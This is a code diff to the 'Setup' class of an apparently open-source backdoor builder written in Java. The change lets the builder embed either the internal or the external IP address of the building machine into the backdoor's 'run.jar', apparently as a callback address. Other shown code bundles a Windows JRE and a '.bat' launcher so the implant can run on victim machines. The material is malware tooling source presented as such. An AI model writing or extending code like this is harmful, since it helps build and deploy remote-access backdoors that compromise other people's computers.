@@ -28,14 +28,17 @@ public class Setup {
 	 * false but directory 'jre' containing a Windows JRE distribution exists, 'jre'
 	 * is copied to 'backdoor' and {@link #createBat(String, String, String)} is
 	 * used to create a '.bat' file for running the backdoor in the JRE. 'run.jar'
-	 * is copied from 'target' to 'backdoor' and 'ip', a text file containing the
-	 * current machine's IPv4 address, is appended into it using
-	 * {@link #appendJar(String, String, String)}.
-	 *
-	 * @param packageJre if a JRE should be packaged with backdoor
+	 * is copied from 'target' to 'backdoor' and 'ip' is appended into it using
+	 * {@link #appendJar(String, String, String)}. If {@link ipType} is "internal",
+	 * 'ip' will contain the internal IP address of the current machine. Otherwise,
+	 * if {@link ipType} is "external", 'ip' will contain the external IP address of
+	 * the current machine.
+	 * 
+	 * @param packageJre if a JRE should be packaged with the backdoor
+	 * @param ipType     type of IP address to append to 'run.jar'
 	 * @throws IOException
 	 */
-	public static void create(boolean packageJre) throws IOException {
+	public static void create(boolean packageJre, String ipType) throws IOException {
 		if (packageJre) {
 			String jrePath = System.getProperty("java.home");
 			FileUtils.copyDirectory(new File(jrePath + File.separator + "bin"),
@@ -49,7 +52,7 @@ public class Setup {
 		}
 		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
 				new File("backdoor" + File.separator + "run.jar"));
-		appendJar("backdoor" + File.separator + "run.jar", "ip", Utils.getIP());
+		appendJar("backdoor" + File.separator + "run.jar", "/ip", Utils.getIP(ipType));
 	}
 
 	/**
